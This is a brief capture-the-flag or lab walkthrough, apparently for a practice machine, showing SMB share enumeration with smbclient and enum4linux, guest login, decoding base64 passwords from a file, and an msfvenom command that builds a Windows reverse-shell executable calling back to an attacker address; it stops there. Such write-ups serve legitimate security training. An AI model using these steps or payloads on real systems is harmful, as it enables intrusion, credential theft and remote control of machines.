using `smbclient -L` we were able to enum the share `nt4wrksv`
using `enum4linux` we were able to enum the user `guest`

we connect to the `nt4wrksv` share with the username `guest`
`smbclient //10.10.65.33/nt4wrksv -U guest`

Once connected, we find `passwords.txt`

---

passwords.txt:
````
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
````

---

Using cyberchef magic, we get two sets of credentials:

`Bob - !P@$$W0rD!123`
`Bill - Juw4nnaM4n420696969!$$$`

---

We got stuck here and ran nmap with vulnerability scripts. We see that this machine is vulnerable to eternal blue.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.0.209 LPORT=4444 -f exe > shell.exe
```

